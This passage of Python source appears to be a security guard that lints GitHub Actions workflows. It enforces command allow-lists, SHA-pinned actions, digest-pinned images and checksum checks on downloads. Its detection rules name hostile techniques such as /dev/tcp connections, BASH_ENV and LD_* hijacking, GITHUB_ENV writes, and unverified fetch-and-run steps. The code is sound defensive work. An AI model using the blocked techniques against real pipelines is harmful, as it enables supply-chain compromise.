    """Round 8 (S8): `command`, `sudo`, `timeout` and `xargs` run the command that follows them; that command is
    held to the same list. A wrapper option outside the short fixed set is refused."""
    rest = list(args)
    if word == "command" and rest and rest[0][0] == "-v":
        return ""
    if word == "sudo":
        while rest and rest[0][0] in ("-E", "-n", "-H"):
            rest.pop(0)
    elif word == "xargs":
        while rest and rest[0][0] in ("-r", "-0"):
            rest.pop(0)
    elif word == "timeout":
        if not rest or not RUN_DURATION_RE.fullmatch(rest[0][0]):
            return "`timeout` without a plain duration first"
        rest.pop(0)
    if not rest or not rest[0][1] or depth >= 4:
        return f"`{word}` followed by a computed, missing or deeply wrapped command"
    return command_problem(rest[0][0], rest[1:], ctx, depth + 1)


def command_problem(word: str, args: List[Tuple[str, bool]], ctx: Optional[RunCtx], depth: int = 0) -> str:
    """Round 8 (S8): "" when ``word`` is in RUN_ALLOWED and its arguments meet the policy of that tool, else the
    reason. A tool that can fetch or run code has a policy; the others take any argument."""
    if word not in RUN_ALLOWED:
        return f"the command `{word[:40]}`, which is not in RUN_ALLOWED"
    texts = [a for a, _l in args]
    plain = [a for a in texts if not a.startswith("-")]
    reason = tool_url_problem(word, texts)
    if reason:
        return reason
    if word in RUN_WRAPPERS:
        return wrapper_problem(word, args, ctx, depth)
    if word in ("bash", "sh", "source", "python3"):
        return script_problem(word, args)
    if word == "git":
        return git_problem(texts)
    if word == "cargo":
        return cargo_problem(texts)
    if word == "docker":
        return docker_problem(texts, ctx)
    if word == "gh":
        if plain[:1] == ["api"] or plain[:2] == ["attestation", "verify"]:
            return ""
        return f"`gh {' '.join(plain[:2])[:30]}`, which is neither `gh api` nor `gh attestation verify`"
    if word == "openssl":
        return "" if texts[:1] and texts[0] in RUN_OPENSSL else f"`openssl {' '.join(texts[:1])[:30]}`, which is not in RUN_OPENSSL"
    if word == "pipx":
        return "" if not [a for a in texts if a.startswith("-")] and tuple(plain) in RUN_PIPX else \
            f"`pipx {' '.join(texts)[:40]}`, which is not in RUN_PIPX"
    if word == "apt-get":
        opts = [a for a in texts if a.startswith("-")]
        pkgs = plain[1:]
        if all(o in ("-y", "-q", "-qq") for o in opts) and (plain == ["update"] or (
                plain[:1] == ["install"] and pkgs and all(p in RUN_APT_PKGS for p in pkgs))):
            return ""
        return f"`apt-get {' '.join(texts)[:40]}`, which is neither `update` nor `install -y` of {', '.join(RUN_APT_PKGS)}"
    if word == "awk":
        if any(a in ("-f", "-i", "-E") or AWK_UNSAFE_RE.search(a) for a in texts):
            return "`awk` with a program that runs a command, reads a program file or loads an extension"
    if word == "sed" and any(SED_UNSAFE_RE.search(a) for a in texts):
        return "`sed` with a script that runs a command"
    return ""


def run_problem(scan: "ShellScan", ctx: Optional[RunCtx]) -> str:
    """Round 8 (S8, 3-agent vote 6def5ab6): "" when every command word of a `run:` text is in RUN_ALLOWED (or is a
    function the text defines) and meets the policy of its tool, else the first reason. A downloader is refused by
    not being listed; no word list names the fetching forms."""
    for name in sorted(scan.funcs):
        if name in RUN_ALLOWED:
            return f"a function named `{name}`, which would replace the listed command"
    for word, literal, args in scan.cmds:
        if not literal:
            if word == "$__GHS__":  # a `${{ secrets.NAME }}` the repository owner set is the whole command
                continue
            return f"the computed command word `{word[:40]}`"
        if word in scan.funcs:
            continue
        reason = command_problem(word, args, ctx)
        if reason:
            return reason
    return ""


def verify_names(scan: "ShellScan", k: int, dl: Iterable[str]) -> Optional[set]:
    """Round 8 (S1, S7): the names the check-mode checksum command ``k`` covers: the names of the `echo` or `printf`
    that feeds it (`echo "$SUM  f" | sha256sum -c -`), or "*" when its checklist is a file the step did not download.
    None when the digest source is not the repository text: a checklist the step downloaded, a download piped in,
    or a command substitution in the echoed text."""
    _word, _lit, args = scan.cmds[k]
    downloaded = set(dl)
    files = [a for a, _l in args if not a.startswith("-")]
    if any(base_of(f) in downloaded for f in files):
        return None
    names: set = {"*"} if files else set()
    j = k
    while j > 0 and scan.info[j]["prev"] == "|":
        j -= 1
        pword, plit, pargs = scan.cmds[j]
        if not (plit and pword in ("echo", "printf")):
            return None
        for arg, alit in pargs:
            if not alit and ("$(" in arg or "`" in arg):
                return None
            names.update(base_of(t) for t in arg.split() if not t.startswith("-"))
    return names


def verified_names(scan: "ShellScan") -> set:
    """Round 8 (S2): the file names any checksum or attestation command of the text names (for the later steps)."""
    out: set = set()
    for k, (word, _lit, args) in enumerate(scan.cmds):
        plain = [a for a, _l in args if not a.startswith("-") and a != "-"]
        if word in FETCH_VERIFIERS and is_verify(word, args):
            out.update((verify_names(scan, k, ()) or set()) - {"*"})
        elif word in FETCH_VERIFIERS or (word.rsplit("/", 1)[-1] == "gh" and "attestation" in plain):
            out.update(base_of(a) for a in plain)
    return out


def fetch_problem(scan: "ShellScan", facts: Dict[str, object]) -> str:
    """Round 6 (vote 6def5ab6): "" unless the text is a fetch step (curl, wget, Invoke-WebRequest, iwr or git clone in
    any word) that runs a command outside FETCH_ALLOWED; then the reason. Round 7: the options of curl and wget are
    listed (N3), a command that consumes a fetched file needs a checksum check first (F3) and no fetched file lands in
    a bin directory. Round 8: the check is per downloaded file (S1), the digest comes from the text and not from a file
    the step downloaded (S7), a wget without `-O` writes the URL's last component (S2), and the words that make a step
    a fetch step no longer try to name every downloader (S8: RUN_ALLOWED does). ``facts`` receives the decoded words,
    the names written and the names a checksum command names."""
    outputs: List[str] = []
    facts.update(words=[norm_name(w) for w in scan.words], outputs=outputs, verified=verified_names(scan))
    clone = any(w == "git" and any(a == "clone" for a, _l in args) for w, _lit, args in scan.cmds)
    if not clone and not any(FETCH_WORD_RE.search(w) for w in scan.words):
        return ""
    if scan.heredocs:
        return "a here-document"
    for name in scan.assigns:
        if DANGEROUS_ASSIGN_RE.fullmatch(name):
            return f"an assignment to `{name}`"
    if any(FETCH_FILE_RE.search(w) for w in scan.words):
        return "a write to GITHUB_ENV or GITHUB_PATH"
    if any("${!" in w for w in scan.words):
        return "an indirect expansion (`${!name}`)"
    if any(w == "errexit" or re.fullmatch(r"\+[A-Za-z]*e[A-Za-z]*", w) for w in scan.words):
        return "`set +e` (the checksum check must stop the step)"
    for target in scan.targets:
        if "$" in target or "`" in target:
            return f"a redirect to the computed path `{target[:40]}`"
    tar_dirs = set()
    for word, _lit, args in scan.cmds:
        for n, (arg, _l) in enumerate(args):
            if word == "tar" and arg.startswith("-") and not arg.startswith("--") and arg.endswith("C") and n + 1 < len(args):
                tar_dirs.add(args[n + 1][0])
    redirected = [t for t in scan.targets if t and not t.isdigit() and t != "-" and not t.startswith("/dev/")]
    outputs.extend(redirected)
    for w in scan.words:
        if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):
            return f"the system bin directory in `{w[:40]}`"
    dl: set = {base_of(t) for t in redirected}  # a file the step downloaded or wrote
    ok: set = set()  # the downloaded files whose own checksum check ran
    any_ok = False
    chain: Optional[Tuple[int, set]] = None  # (index of a check followed by `&&`, the names it covers)
    for k, (word, literal, args) in enumerate(scan.cmds):
        info = scan.info[k]
        if not literal or word not in FETCH_ALLOWED:
            return f"the command `{word[:40]}`"
        plain = [a for a, _l in args if not a.startswith("-")]
        if word in ("curl", "wget"):
            if info["sub"]:
                return f"a `{word}` inside a command substitution"
            written: List[str] = []
            reason = option_problem(word, args, written)
            if reason:
                return reason
            outputs.extend(written)
            for out in written:
                dl.add(base_of(out))
                ok.discard(base_of(out))
        if word == "tar":
            for n, (arg, _lit) in enumerate(args):
                if arg.startswith("--"):
                    good = TAR_LONG_RE.fullmatch(arg) is not None
                else:
                    good = arg.startswith("-") or n == 0
                    good = TAR_FLAGS_RE.fullmatch(arg) is not None if good else True
                if not good:
                    return f"the tar option `{arg[:40]}`"
        chained = chain is not None and chain[0] == k - 1 and info["prev"] == "&&"
        extra = chain[1] if chained and chain is not None else set()
        covered = ok | extra
        if word in FETCH_CONSUMERS:
            named = [base_of(a) for a in plain if base_of(a) in dl]
            if named:
                missing = [n for n in named if n not in covered]
                if missing:
                    return (f"`{word}` of the downloaded `{missing[0][:40]}` before its own checksum check (a top-level "
                            "`sha256sum -c` or `shasum -c` of that file, fed by text of the step, must stop the step first)")
            elif not (any_ok or chained):
                return f"`{word}` before a checksum check (a top-level `sha256sum -c` or `shasum -c` must stop the step first)"
        if word in ("mv", "cp") and plain:
            outputs.append(plain[-1])
            sources = [base_of(a) for a in plain[:-1] if base_of(a) in dl]
            if sources:
                dl.add(base_of(plain[-1]))
                (ok.add if all(s in covered for s in sources) else ok.discard)(base_of(plain[-1]))
        first = k
        while first > 0 and scan.info[first]["prev"] == "|":  # a pipeline stands or falls with its first command
            first -= 1
        start = scan.info[first]
        if is_verify(word, args) and info["top"] and not start["neg"] and start["prev"] in ("\n", ";"):
            names = verify_names(scan, k, dl)
            if names is not None:
                names = set(dl) if "*" in names else {n for n in names if n in dl}
                if info["nxt"] in ("\n", ";", ""):
                    ok |= names
                    any_ok = True
                elif info["nxt"] == "&&":
                    chain = (k, names)
    for out in outputs:
        if base_of(out) in FETCH_ALLOWED:
            return f"a download written over the command name `{base_of(out)[:40]}`"
    return ""


MAX_LOCAL_DEPTH = 8  # nested local composite actions followed before a chain is refused


def uses_where(doc: Node, path: Tuple[str, ...]) -> str:
    """#8021: the job and the step a `uses:` at ``path`` belongs to (never only a line number)."""
    if len(path) >= 2 and path[0] == "jobs":
        where = f"job `{path[1]}`"
        if len(path) >= 5 and path[2] == "steps" and path[3].isdigit():
            where += f" step {int(path[3]) + 1}"  # #8031: 1-based, as the #6290 `steps.N` messages
            jobs = doc.get("jobs")
            job = jobs.get(path[1]) if jobs is not None else None
            steps = job.get("steps") if job is not None else None
            if steps is not None and steps.kind == "seq" and isinstance(steps.value, list):
                idx = int(path[3])
                step = steps.value[idx] if idx < len(steps.value) else None
                label = step.get("name") if step is not None else None
                if label is not None and label.kind == "scalar":
                    where += f" ({label.text().strip()[:50]})"
        return where
    return "path `" + ".".join(path) + "`"


def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chain: Tuple[Path, ...]) -> int:
    """One `uses:` value: pinned (USES_PINNED_RE), compared per action (#8030, Round 5 F1), and a local
    action is opened and inspected (Round 5 F5)."""
    ref = node.text().strip()
    if node.kind != "scalar" or not USES_PINNED_RE.fullmatch(ref):
        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` is not pinned to a "
                "full 40-hex commit sha (#6904: a tag, branch or short ref can be re-pointed)"
                + pin_hint("USES_PINNED_RE"))
        return 0
    # #8030 (the #6904 acceptance): where a *_USES constant exists for the action, the ref must
    # equal it exactly; another 40-hex sha is an unreviewed commit. release.yml's docker job is
    # pinned whole by DOCKER_STEPS, which already names the constant, so it is not reported twice.
    # Round 5 (F1): GitHub resolves owner and repository case-insensitively and runs a subpath of the
    # repository, so the action is keyed on the lower-cased first two path components and the pinned
    # sha must be the allowlisted one for that key whatever spelling or subpath the ref uses.
    spec, _, sha = ref.partition("@")
    if ref.startswith("./"):
        return check_local_action(ref, node, name, where, rep, chain)
    if spec.startswith("docker://"):
        return 0
    segs = spec.split("/")
    if any(seg in ("", ".", "..") for seg in segs):
        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` has an empty, `.` or "
                "`..` path segment (a normalised path can name another action than the one reviewed)")
        return 0
    want = USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))
    if want is not None and sha != want.partition("@")[2] and not exempt:
        rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` differs from "
                f"{USES_CONSTANTS[want]} (`{want}`; #6904: a per-action constant comparison on the "
                "case-folded owner/repo, any subpath kept)" + pin_hint(USES_CONSTANTS[want]))
    return 0


def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report, chain: Tuple[Path, ...]) -> int:
    """Round 5 (F5): a local `./path` action is loaded from the checked-out tree and held to the same rules. Round 7
    (N6): the depth is counted on the resolved path and a walked action keeps the height of the chain below it, so an
    action reached shallow first and deep later is refused at the deep site; the height (this action plus the deepest
    chain below it) is returned."""
    rel = ref[2:]
    here = f"{name}: {where}: line {node.line + 1}: local action `{rel}`"
    if rep.root is None:
        rep.bad(f"{here} cannot be inspected (no checked-out tree to read it from)")
        return 0
    try:
        tree = rep.root.resolve()
        target = (tree / rel).resolve()
    except (OSError, RuntimeError):
        rep.bad(f"{here} cannot be resolved (a symlink loop or an unreadable path)")
        return 0
    if tree != target and tree not in target.parents:
        rep.bad(f"{here} resolves outside the checked-out tree")
        return 0
    if target in chain:
        rep.bad(f"{here} is part of a cycle of local actions")
        return 0
    if len(chain) >= MAX_LOCAL_DEPTH:
        rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep")
        return 0
    if target in rep.walked:  # Round 6 (R4-3): an action reached again by a fan-out is walked once
        height = rep.heights.get(target, 1)
        if len(chain) + height > MAX_LOCAL_DEPTH:
            rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep (reached again below an earlier path; "
                    "its own chain is counted on this one)")
        return height
    rep.walked.add(target)
    rep.heights[target] = 1
    action = next((target / f for f in ("action.yml", "action.yaml") if (target / f).is_file()), None)
    if action is None:
        rep.bad(f"{here} has no action.yml or action.yaml (a local action that cannot be read is not inspected)")
        return 1
    label = f"{rel}/{action.name}"
    text = load(action, label, rep, True)
    if text is None:
        return 1
    adoc = parse_yaml(text, label, rep)
    if adoc is None:
        return 1
    runs = adoc.get("runs")
    using = runs.get("using") if runs is not None else None
    kind = using.text().strip() if using is not None and using.kind == "scalar" else ""
    height = 1
    if kind == "composite":
        steps = runs.get("steps") if runs is not None else None
        if steps is None or steps.kind != "seq" or not steps.value:
            rep.bad(f"{here}: `runs.steps` must be a non-empty list")
            return 1
        ctx = run_context(steps, ())
        for i, step in enumerate(steps.value):
            where_step = f"local action `{rel}` step {i + 1}"
            if step.kind != "map":
                rep.bad(f"{label}: {where_step}: line {step.line + 1}: a step must be a mapping")
                continue
            uses = step.get("uses")
            if uses is not None:
                height = max(height, 1 + check_ref(uses, label, where_step, rep, False, chain + (target,)))
            check_run(step, label, where_step, rep, ctx)
    elif kind == "docker":
        image = runs.get("image") if runs is not None else None
        if image is None or image.kind != "scalar" or not DOCKER_USES_RE.fullmatch(image.text().strip()):
            rep.bad(f"{here}: `runs.image` must be a `docker://...@sha256:<64 hex>` image")
    elif kind.startswith("node"):
        main = runs.get("main") if runs is not None else None
        try:
            entry = (target / main.text().strip()).resolve() if main is not None and main.kind == "scalar" else None
        except (OSError, RuntimeError):  # a symlink loop in `main` is a refusal, never an exception
            entry = None
        if entry is None or (target != entry and target not in entry.parents) or not entry.is_file():
            rep.bad(f"{here}: `runs.main` must name a file inside the action directory")
    else:
        rep.bad(f"{here}: `runs.using` must be `composite`, `docker` or `node*` (got `{kind[:30]}`)")
    rep.heights[target] = height
    return height


SHELL_ALLOWED = ("bash", "sh")  # Round 7 (N4, F4): the shells whose `-e` behaviour the checksum rule relies on


def matrix_variants(raw: str, ctx: RunCtx) -> List[Tuple[str, str]]:
    """Round 8 (S4): the run text once per literal value of each `${{ matrix.<key> }}` it names, as (label, text), the
    way GitHub splices the value in before the shell reads the text."""
    keys: List[str] = []
    for m in EXPR_RE.finditer(raw):
        parts = m.group(1).strip().split(".")
        if len(parts) == 2 and parts[0] == "matrix" and parts[1] in ctx.matrix_values and parts[1] not in keys:
            keys.append(parts[1])
    out: List[Tuple[str, str]] = []
    for key in keys:
        for value in ctx.matrix_values[key]:
            if "${{" in value:
                continue  # an expression value is refused by check_matrix_exprs
            text = EXPR_RE.sub(lambda m, k=key, v=value: v if m.group(1).strip() == f"matrix.{k}" else "$__GHX__", raw)
            out.append((f"matrix.{key} = {value[:40]}", text))
    return out


def glob_hit(fetched: str, part: str) -> bool:
    """A word part with a glob character that matches the downloaded name (and has some other character too)."""
    return any(c in part for c in "*?[") and bool(part.strip("*?[]")) and fnmatch.fnmatchcase(fetched, part)


def check_env_keys(env: Optional[Node], name: str, where: str, rep: Report) -> None:
    """Round 8 (S6): an `env:` mapping (workflow, job or step) sets no variable that changes what the shell, the
    linker, curl, git or a package tool loads (`BASH_ENV`, `ENV`, `PATH`, `LD_*`, ...), as an inline assignment cannot."""
    if env is None or env.kind != "map":
        return
    for key in env.keys():
        if DANGEROUS_ASSIGN_RE.fullmatch(key):
            rep.bad(f"{name}: {where}: line {env.line + 1}: `env:` sets `{key}`, which changes what the shell or a tool "
                    "loads before it runs (Round 8, S6: the inline form is refused, so the mapping form is too)")


def check_run(step: Node, name: str, where: str, rep: Report, ctx: RunCtx) -> None:
    """Round 6 (vote 6def5ab6): a `run:` names only allow-listed expression roots, and a fetch step runs only
    the commands of FETCH_ALLOWED. Round 7 adds the shell, the network-redirection patterns and the check that a
    step naming a downloaded file verifies it. Round 8 holds every command word of every `run:` to RUN_ALLOWED (S8),
    scans the literal matrix values that reach the text (S4) and checks the names against the checksum commands."""
    run = step.get("run")
    if run is None:
        return
    raw = run_text(run)
    if raw is None:
        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` must be a scalar or a block (got {run.kind})")
        return
    shell = step.get("shell")
    if shell is not None:
        got = shell.text().strip() if shell.kind == "scalar" else ""
        if got not in SHELL_ALLOWED:
            rep.bad(f"{name}: {where}: line {shell.line + 1}: `shell: {(got or shell.kind)[:30]}` is not allowed (Round 7: a "
                    f"step runs under {' or '.join(SHELL_ALLOWED)}, whose `-e` stops a failed checksum check)")
    elif ctx.windows and not ctx.default_shell:
        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` has no `shell:` on a Windows runner (the default shell there "
                f"is pwsh; Round 7: name {' or '.join(SHELL_ALLOWED)})")
    check_env_keys(step.get("env"), name, where, rep)
    for m in EXPR_RE.finditer(raw):
        if expr_allowed(m.group(1), ctx):
            continue
        parts = m.group(1).strip().split(".")
        if len(parts) == 4 and parts[0] == "steps" and parts[2] == "outputs" and parts[1] in ctx.uses_ids:
            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}`, the output of a `uses:` step "
                    "(Round 8, S3, 3-agent vote 6def5ab6 option B: only the outputs of a `run:` step may appear in run "
                    "text, because an action computes its outputs from inputs this guard cannot read; pass it through `env:`)")
        else:
            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}` into the script "
                    "(Round 6: only matrix.<key>, secrets.<NAME> and steps.<id>.outputs.<name> of a `run:` step of the "
                    "same job may appear in run text; pass any other value through `env:` and quote it in the script)")
    if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):
        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` opens a network connection through /dev/tcp, /dev/udp or an "
                "`exec <n<>` descriptor (Round 7, F5: a download that no fetch word names)")
    text = EXPR_RE.sub(lambda m: "$__GHS__" if m.group(1).strip().startswith("secrets.") else "$__GHX__", raw)
    facts: Dict[str, object] = {}
    try:
        scan = ShellScan(text)
    except ShellError as err:
        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is text the scanner cannot read ({err}); Round 8, S8: every "
                "command word of a `run:` text is checked against the run allow-list, so unreadable text is refused")
        facts.update(words=[norm_name(text)], outputs=[], verified=set())
    else:
        reason = run_problem(scan, ctx)
        problem = fetch_problem(scan, facts)
        if problem:  # one line per cause: the fetch-step reason names the command, so the allow-list line is not repeated
            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is a fetch step that runs {problem} "
                    "(Round 6, 3-agent vote 6def5ab6: a step that downloads may run only "
                    f"{', '.join(FETCH_ALLOWED)}, the fetch allow-list; split it into a fetch step and a use step)")
        elif reason and not (DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw)):
            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` runs {reason} (Round 8, S8, 3-agent vote 6def5ab6: the "
                    f"run allow-list RUN_ALLOWED names every command word a `run:` may use, {', '.join(RUN_ALLOWED[:6])}, ...)")
        for label, variant in matrix_variants(raw, ctx):
            try:
                vscan = ShellScan(variant)
                why = run_problem(vscan, ctx) or fetch_problem(vscan, {})
            except ShellError as err:
                why = f"text the scanner cannot read ({err})"
            if why:
                rep.bad(f"{name}: {where}: line {run.line + 1}: matrix value `{label}` spliced into `run:` runs {why} "
                        "(Round 8, S4: a literal matrix value is scanned as run text)")
    words = [w for w in facts.get("words", [])]  # type: ignore[union-attr]
    parts = {p for w in words for p in re.split(r"[/=:]", w)}  # a path component or an option value, never a substring
    verified = facts.get("verified", set())
    for hit in sorted(f for f in ctx.fetched if f in parts or any(glob_hit(f, p) for p in parts)):
        if hit in verified or (hit.endswith(".sha256") and hit[:-len(".sha256")] in ctx.fetched):
            continue
        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` names `{hit[:40]}`, a file an earlier step of the job "
                "downloaded, and no `sha256sum`, `shasum` or `gh attestation verify` of this step names that file "
                "(Round 8, S2: the checksum tool must name the exact downloaded file; a glob does not; a downloaded file is "
                "checked in the step that uses it)")
        break
    for out in facts.get("outputs", []):  # type: ignore[union-attr]
        base = base_of(str(out))
        if base:
            ctx.fetched.add(base)


def defaults_shell(node: Node, name: str, what: str, rep: Report) -> str:
    """Round 7 (N4): the `defaults.run.shell` of the workflow or a job: "" when unset, else it must be bash or sh."""
    defaults = node.get("defaults")
    run = defaults.get("run") if defaults is not None else None
    for held in (defaults, run):  # Round 8 (S5): a scalar `defaults` or `defaults.run` hides the shell, so it is a problem
        if held is not None and held.kind != "map":
            rep.bad(f"{name}: {what}: line {held.line + 1}: `defaults.run.shell: {held.kind}` is not allowed (Round 8, S5: "
                    f"`defaults` and `defaults.run` must be mappings so the shell they name can be read; {' or '.join(SHELL_ALLOWED)} only)")
            return ""
    shell = run.get("shell") if run is not None else None
    if shell is None:
        return ""
    got = shell.text().strip() if shell.kind == "scalar" else ""
    if got not in SHELL_ALLOWED:
        rep.bad(f"{name}: {what}: line {shell.line + 1}: `defaults.run.shell: {(got or shell.kind)[:30]}` is not allowed "
                f"(Round 7: {' or '.join(SHELL_ALLOWED)} only)")
    return got


def job_windows(job: Node) -> bool:
    """True when a job runs (or may run, for a matrix) on a Windows label."""
    ro = job.get("runs-on")
    text = ro.text().strip().lower() if ro is not None and ro.kind == "scalar" else ""
    if RUNS_ON_MATRIX_RE.fullmatch(text):
        return any(v.lower().startswith("windows") for v in matrix_os_values(job))
    return text.startswith("windows")


def check_matrix_exprs(job: Node, name: str, jname: str, rep: Report) -> None:
    """Round 7 (F2): no matrix value of a job other than release.yml's `release` job (pinned by check_matrix) is an
    expression, so no event value can widen what the job's own `run:` text may name."""
    st = job.get("strategy")
    matrix = st.get("matrix") if st is not None else None
    if matrix is not None and any("${{" in t for t in node_texts(matrix)):
        rep.bad(f"{name}: job `{jname}`: line {matrix.line + 1}: a `strategy.matrix` value is an expression (Round 7, F2: "
                "a matrix value of this job must be a literal; only release.yml's `release` job is pinned by check_matrix)")


def check_runs_on(job: Node, name: str, jname: str, rep: Report) -> None:
    """Round 6 (security 3, 4): a job runs on one hosted label, or on `${{ matrix.os }}` of a hosted-only matrix."""
    ro = job.get("runs-on")
    if ro is None:
        return  # a reusable-workflow job has none; a missing one is actionlint's
    text = ro.text().strip() if ro.kind == "scalar" and ro.style == "plain" else ""  # a flow list `[x]` is not a label
    ok = text in HOSTED_RUNNERS
    if not ok and RUNS_ON_MATRIX_RE.fullmatch(text):
        values = matrix_os_values(job)
        ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)
    if not ok:
        rep.bad(f"{name}: job `{jname}`: line {ro.line + 1}: `runs-on` must be a hosted label "
                f"({', '.join(HOSTED_RUNNERS)}) or `${{{{ matrix.os }}}}` of a matrix whose `os` values are all hosted "
                f"(got `{(text or ro.kind)[:40]}`)")


def on_canon(node: Node) -> object:
    """The `on:` block as plain data (descriptions dropped) for the ON_PINS comparison."""
    if node.kind == "scalar":
        return node.text()
    if node.kind == "seq":
        return [on_canon(n) for n in node.value]  # type: ignore[union-attr]
    if node.kind == "map":
        return {k: on_canon(v) for k, v in node.value.items() if k != "description"}  # type: ignore[union-attr]
    return None


def on_triggers(node: Node) -> List[str]:
    if node.kind == "map":
        return list(node.keys())
    if node.kind == "seq":
        return [n.text().strip() for n in node.value if n.kind == "scalar"]  # type: ignore[union-attr]
    if node.kind == "scalar":
        return [p for p in re.split(r"[\s,\[\]]+", node.text()) if p]
    return []


def check_on(doc: Node, name: str, rep: Report) -> None:
    """Round 6 (security 5): no workflow_call, pull_request_target or repository_dispatch trigger, and the `on:`
    block of release.yml, c8-precheck.yml and publish-ci-image.yml is pinned."""
    on = doc.get("on")
    if on is None:
        return
    bad = [t for t in on_triggers(on) if t in ON_FORBIDDEN]
    if bad:
        rep.bad(f"{name}: `on:` line {on.line + 1}: trigger `{bad[0]}` is not allowed (no guarded workflow may be "
                f"called, or run with a write token on a fork's code, or be dispatched from outside: {', '.join(ON_FORBIDDEN)})")
    pin = ON_PINS.get(name)
    if pin is not None and json.dumps(on_canon(on), sort_keys=True, separators=(",", ":")) != pin:
        rep.bad(pin_message(f"{name}: `on:` line {on.line + 1}", "the trigger block differs from its pin", "ON_PINS"))


def check_images(job: Node, name: str, jname: str, rep: Report) -> None:
    """Round 5 (F2): every container and service image of a job is pinned by digest."""
    where = f"{name}: job `{jname}`"
    container = job.get("container")
    if container is not None:
        image = container if container.kind == "scalar" else container.get("image") if container.kind == "map" else None
        if image is None or image.kind != "scalar" or not IMAGE_DIGEST_RE.fullmatch(image.text().strip()):
            rep.bad(f"{where}: line {container.line + 1}: `container` image must be pinned by digest "
                    "(`name@sha256:<64 hex>`; a tag or a bare name can be re-pointed)")
    services = job.get("services")
    if services is None:
        return
    if services.kind != "map":
        rep.bad(f"{where}: line {services.line + 1}: `services` must be a mapping of pinned images")
        return
    for sname, service in services.value.items():  # type: ignore[union-attr]
        image = service.get("image") if service.kind == "map" else None
        if image is None or image.kind != "scalar" or not IMAGE_DIGEST_RE.fullmatch(image.text().strip()):
            rep.bad(f"{where}: line {service.line + 1}: `services.{sname}.image` must be pinned by digest "
                    "(`name@sha256:<64 hex>`; a tag or a bare name can be re-pointed)")


def check_jobs_shape(doc: Node, name: str, rep: Report) -> None:
    """Round 5 (F3, F2, F4): the shape of `jobs`, each job, its `needs`, `steps` and steps, then images and run text."""
    jobs = doc.get("jobs")
    if jobs is None or jobs.kind != "map" or not jobs.keys():
        rep.bad(f"{name}: `jobs:` must be a non-empty mapping (got {'nothing' if jobs is None else jobs.kind})")
        return
    wf_shell = defaults_shell(doc, name, "workflow", rep)
    check_env_keys(doc.get("env"), name, "workflow", rep)
    for jname, job in jobs.value.items():  # type: ignore[union-attr]
        where = f"{name}: job `{jname}`"
        if job.kind != "map":
            rep.bad(f"{where}: line {job.line + 1}: a job must be a mapping (got {job.kind})")
            continue
        job_shell = defaults_shell(job, name, f"job `{jname}`", rep) or wf_shell
        check_env_keys(job.get("env"), name, f"job `{jname}`", rep)
        needs = job.get("needs")
        if needs is not None and not (needs.kind == "scalar" or (
                needs.kind == "seq" and all(n.kind == "scalar" for n in needs.value))):  # type: ignore[union-attr]
            rep.bad(f"{where}: line {needs.line + 1}: `needs` must be a string or a list of strings")
        check_images(job, name, jname, rep)
        if not (name == "release.yml" and jname == "release"):  # pinned by check_release_job and check_matrix
            check_runs_on(job, name, jname, rep)
            check_matrix_exprs(job, name, jname, rep)
        steps = job.get("steps")
        if job.get("uses") is not None and steps is None:
            continue  # a reusable-workflow job has no steps; its `uses` is pinned by check_ref
        if steps is None or steps.kind != "seq" or not steps.value:
            rep.bad(f"{where}: `steps` must be a non-empty list (got {'nothing' if steps is None else steps.kind})")
            continue
        ctx = run_context(steps, matrix_keys(job), (doc.get("env"), job.get("env")), job_shell, job_windows(job),
                          matrix_literals(job))
        for i, step in enumerate(steps.value):  # type: ignore[union-attr]
            if step.kind != "map":
                rep.bad(f"{where} step {i + 1}: line {step.line + 1}: a step must be a mapping (got {step.kind})")
                continue
            check_run(step, name, f"job `{jname}` step {i + 1}", rep, ctx)


def check_uses_pinned(doc: Node, name: str, rep: Report) -> None:
    """#6904: every `uses:` of every job and step is pinned (USES_PINNED_RE).

    Called for release.yml, release-shape.yml, c8-precheck.yml and
    publish-ci-image.yml (#8002, #8020): each refusal names the job and step.
    Round 5 adds the workflow-shape, image, `run:` and local-action checks of one workflow."""
    for path, node in walk(doc):
        if not path or path[-1] != "uses":
            continue
        check_ref(node, name, uses_where(doc, path), rep, name == "release.yml" and path[:2] == ("jobs", "docker"), ())
    check_on(doc, name, rep)
    check_jobs_shape(doc, name, rep)


def check_release_yml(text: str, rep: Report) -> None:
    check_no_bash_env("release.yml", text, rep)
    check_text_counts(text, rep)
    doc = parse_yaml(text, "release.yml", rep)
    if doc is None:
        return
    check_blocks(doc, "release.yml", rep)
    check_run_continuations(doc, "release.yml", rep)
    check_uses_pinned(doc, "release.yml", rep)
    check_secrets_and_registry(doc, rep)
    for key in doc.keys():
        if key not in TOP_KEYS:
            rep.bad(f"release.yml top level: `{key}:` is not allowed (allowed: {', '.join(TOP_KEYS)})" + pin_hint("TOP_KEYS"))
    jobs = doc.get("jobs")
    if not want_kind(jobs, "map", "release.yml `jobs:`", rep) or jobs is None:
        return
    check_release_permissions(doc, jobs, rep)
    release, sbom = jobs.get("release"), jobs.get("sbom")
    if want_kind(release, "map", "release.yml `jobs.release`", rep) and release is not None:
        check_release_job(release, rep)
    if want_kind(sbom, "map", "release.yml `jobs.sbom`", rep) and sbom is not None:
        check_sbom_job(sbom, rep)
    check_docker_job(jobs, rep)


def docker_nearest(builder: List[str]) -> str:
    want = tuple(DOCKER_RUN.split("; "))
    runs = [ins for ins in builder if ins.upper().startswith("RUN ")]
    if not runs:
        return "the builder stage has no RUN"
